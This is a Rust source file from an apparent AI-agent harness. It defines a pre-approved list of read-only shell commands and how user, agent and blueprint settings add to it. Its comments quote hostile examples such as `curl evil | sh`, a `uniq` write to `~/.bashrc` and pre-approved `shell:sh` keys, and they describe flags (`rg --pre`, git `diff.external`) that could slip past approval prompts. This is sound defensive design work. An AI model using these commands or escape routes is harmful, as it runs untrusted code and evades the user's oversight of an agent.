//! What a run may do without asking anybody.
//!
//! An `ask` policy is all-or-nothing per tool name, which for the shell means
//! choosing between a prompt on every `ls` and no prompt on `curl evil | sh`.
//! On a real run that produced roughly 85 interruptions for one task, of which
//! four were worth a person's attention.
//!
//! A safe-command entry closes that gap without a second permission mechanism.
//! It is a pre-seeded, immutable set of keys in exactly the format
//! [`crate::shell_keys`] produces for a grant, so "this is pre-approved" and
//! "the user approved this" are one lookup, and the property that makes grants
//! safe is inherited rather than re-implemented: coverage needs *every* command
//! in a line, so a safe `ls` does not cover `ls && curl evil` - `shell:curl` is
//! in neither set.
//!
//! Safe entries only ever collapse `Ask` into `Allow`. They never reach `Deny`,
//! and an entry that came from a downloaded `agent.leviath` is inert until the
//! user opts in - see [`resolve_safe_keys`].

use std::collections::BTreeMap;

use serde::{Deserialize, Serialize};

use crate::shell_keys::{KEY_PREFIX, is_valid_prefix};

/// Shell commands that are safe to run without asking.
///
/// The rule an entry has to pass, which matters more than the list because the
/// list will grow: **it must not be able to write a file, execute another
/// program, or open a network connection under any flag.**
///
/// That rule is why several obvious candidates are absent. `find` takes
/// `-exec` and `-delete`; `sed` takes `-i`; `awk` has `system()`; `sort` takes
/// `-o`; `tee`, `xargs`, `env`, `nohup`, `timeout` and `watch` all run a
/// program named in their arguments; `cargo` runs build scripts and test
/// binaries. Any of them can be added by name in `[safe_commands] shell`, which
/// is the point of the setting.
///
/// Three entries were removed after an audit found the list did not obey its
/// own rule, which is worth recording because they read as harmless:
/// - `uniq` takes an **output operand** (`uniq IN OUT`), so `uniq payload
///   ~/.bashrc` wrote an arbitrary file with no prompt. Positional, so no flag
///   check could have caught it.
/// - `tree` takes `-o FILE`.
/// - `rg` takes `--pre COMMAND`, which runs that command over every input file,
///   and `-z`, which shells out to decompressors.
///
/// The `git` entries stay, because read-only git is most of what a coding agent
/// does - but `--output` is a diff-machinery option accepted by `diff`, `log`
/// and `show`, so a git segment carrying it is refused by
/// [`crate::shell_keys`]. That is a patch on one known escape, not a claim that
/// git has no others: `[sandbox]` is the durable answer, and this list is
/// pre-decided convenience inside it.
///
/// Two consequences worth stating rather than burying. `cat`, `head` and `grep`
/// being safe lets an agent read any file the user can, without the `read_paths`
/// confinement `read_file` has - not a new capability, since approving the first
/// `cat` for the run already granted it, but it is now pre-decided; set
/// `defaults = false` to opt out. And the read-only `git` subcommands honour a
/// repository's `core.pager` and `diff.external`. A pager does not run without
/// a tty, but `diff.external` does - reachable only via `git -c`, which keys as
/// a bare `git` and so is not covered by any entry here.
pub const DEFAULT_SAFE_SHELL: &[&str] = &[
    // Reading and listing.
    "ls",
    "cat",
    "head",
    "tail",
    "wc",
    "cut",
    "tr",
    "grep",
    "egrep",
    "fgrep",
    "diff",
    "cmp",
    "file",
    "stat",
    "du",
    "df",
    "jq",
    "column",
    "od",
    "strings",
    "basename",
    "dirname",
    "realpath",
    "readlink",
    "pwd",
    "cd",
    // Reporting.
    "echo",
    "printf",
    "date",
    "seq",
    "sleep",
    "true",
    "false",
    "test",
    "which",
    "type",
    "uname",
    "hostname",
    "whoami",
    "id",
    "ps",
    "pgrep",
    // Read-only git.
    "git status",
    "git diff",
    "git log",
    "git show",
    "git branch",
    "git remote",
    "git rev-parse",
    "git blame",
    "git describe",
    "git ls-files",
];

/// Where a safe key came from, for `lev approvals safe`.
///
/// The question this answers is "why did it not ask me", which is the one a
/// person asks the first time a run does something unprompted.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub(crate) enum SafeSource {
    /// [`DEFAULT_SAFE_SHELL`], or a built-in tool that never prompts.
    Default,
    /// The user's `[safe_commands]`.
    Config,
    /// The user's `[agent_safe_commands.<name>]`.
    Agent,
    /// The blueprint's own `[safe_commands]`, which the user opted into.
    Blueprint,
}

/// The user's `[safe_commands]` block.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SafeCommands {
    /// Ship the built-in read-only verb list. On by default: `read_file` is
    /// already `allow` while `cat file` prompts, and closing that incoherence is
    /// most of what this setting is for.
    ///
    #[serde(default = "leviath_core::default_true")]
    pub defaults: bool,
    /// Tools that need no prompt whatever their arguments. Built-in names, or
    /// MCP names in their advertised form (`server__tool`).
    #[serde(default)]
    pub tools: Vec<String>,
    /// Shell command prefixes that need no prompt, in the same string space a
    /// grant is keyed on, so `git status` can never cover `git push`.
    #[serde(default)]
    pub shell: Vec<String>,
}

/// Hand-written rather than derived, because `#[derive(Default)]` would give
/// `defaults: false` while `#[serde(default = "leviath_core::default_true")]` gives `true` for
/// the same absent section. That split is invisible and load-bearing: a user
/// with no config file at all goes through `Default`, a user with a config file
/// and no `[safe_commands]` section goes through serde, and they must land on
/// the same behaviour.
impl Default for SafeCommands {
    fn default() -> Self {
        Self {
            defaults: leviath_core::default_true(),
            tools: Vec::new(),
            shell: Vec::new(),
        }
    }
}

/// A per-agent `[agent_safe_commands.<name>]` block.
///
/// Mirrors `[agent_tool_permissions]` and `[agent_read_paths]`: naming the agent
/// is the user saying "I trust this one", which is a decision that belongs in
/// their config rather than in a manifest they downloaded.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct AgentSafeCommands {
    /// Tool names this agent asks to have pre-approved.
    #[serde(default)]
    pub tools: Vec<String>,
    /// Shell grant-key prefixes it asks to have pre-approved. A prefix that
    /// could write a file or run an unnamed program is refused at load.
    #[serde(default)]
    pub shell: Vec<String>,
    /// Honour this agent's own `[safe_commands]` block. Off by default:
    /// declaring is not granting.
    #[serde(default)]
    pub allow_blueprint: bool,
}

/// The safe keys in effect for one run, and where each came from.
///
/// **Declaring is not granting.** A blueprint's own block contributes nothing
/// unless `allow_blueprint` names this agent or
/// `[security] allow_blueprint_safe_commands` is set, which is the same shape
/// `[read_paths]` already uses: a manifest the user downloaded may describe what
/// it would like to run unprompted, and the user decides whether that counts.
/// This is also why `resolve_policy` needs no new argument and its "a blueprint
/// may only tighten" tests keep their meaning.
///
/// An entry that is not a valid prefix is skipped with a warning rather than
/// failing the spawn: a typo in a config file should cost one prompt, not a run.
pub(crate) fn resolve_safe_keys(
    config: &SafeCommands,
    agent: Option<&AgentSafeCommands>,
    blueprint: Option<&leviath_core::blueprint::SafeCommandsConfig>,
    allow_blueprint_globally: bool,
) -> BTreeMap<String, SafeSource> {
    let mut keys = BTreeMap::new();
    if config.defaults {
        for entry in DEFAULT_SAFE_SHELL {
            keys.insert(format!("{KEY_PREFIX}{entry}"), SafeSource::Default);
        }
    }
    add(&mut keys, &config.tools, &config.shell, SafeSource::Config);
    if let Some(agent) = agent {
        add(&mut keys, &agent.tools, &agent.shell, SafeSource::Agent);
    }
    let opted_in = allow_blueprint_globally || agent.is_some_and(|a| a.allow_blueprint);
    if let (true, Some(bp)) = (opted_in, blueprint) {
        add(&mut keys, &bp.tools, &bp.shell, SafeSource::Blueprint);
    }
    keys
}

/// Fold one layer's entries in, later layers winning the `source` label so
/// `lev approvals safe` names the narrowest thing that put a key there.
fn add(
    keys: &mut BTreeMap<String, SafeSource>,
    tools: &[String],
    shell: &[String],
    source: SafeSource,
) {
    for tool in tools {
        // `tools` and `shell` land in one map, so a `tools` entry spelled with
        // the shell prefix would enter the shell key space without going
        // through `is_valid_prefix` - which is the only thing standing between
        // a config file and a pre-approved `shell:>/root/.bashrc`,
        // `shell:sh`, or `shell:env:PATH`. A tool name never needs that
        // prefix, so refusing it costs nothing and closes the back door.
        if tool.starts_with(KEY_PREFIX) {
            tracing::warn!(
                "ignoring safe_commands tools entry {tool:?}: shell commands belong in the \
                 `shell` list, where they are checked"
            );
            continue;
        }
        keys.insert(tool.clone(), source);
    }
    for entry in shell {
        if !is_valid_prefix(entry) {
            tracing::warn!(
                "ignoring safe_commands shell entry {entry:?}: it is not a bare command prefix \
                 (a program, optionally with the subcommand that narrows it)"
            );
            continue;
        }
        keys.insert(format!("{KEY_PREFIX}{entry}"), source);
    }
}

#[cfg(test)]
mod tests;
